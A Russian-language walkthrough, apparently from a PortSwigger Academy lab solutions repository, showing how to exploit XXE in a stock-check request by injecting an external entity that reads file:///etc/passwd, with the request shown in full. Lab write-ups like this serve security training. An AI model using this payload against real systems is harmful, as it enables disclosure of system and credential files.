Перейдем на уязвимый ресурс в случайную карточку товара и проверим ее наличие через кнопку `Get stock`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/1.%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/pics%20for%20walktrough/1.png)
и так же найдем данный запрос в `Proxy` -> `HTTP history`
```
POST /product/stock
...
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/1.%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/pics%20for%20walktrough/2.png)
Отправим запрос в `Repeater` и вставим `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` чтобы добраться до `/etc/passwd`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
В ответ видим 400 респонс статус код, но все равно отдавший нам содержимое `/etc/passwd` и получаем уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/1.%20Exploiting%20XXE%20using%20external%20entities%20to%20retrieve%20files/pics%20for%20walktrough/3.png)
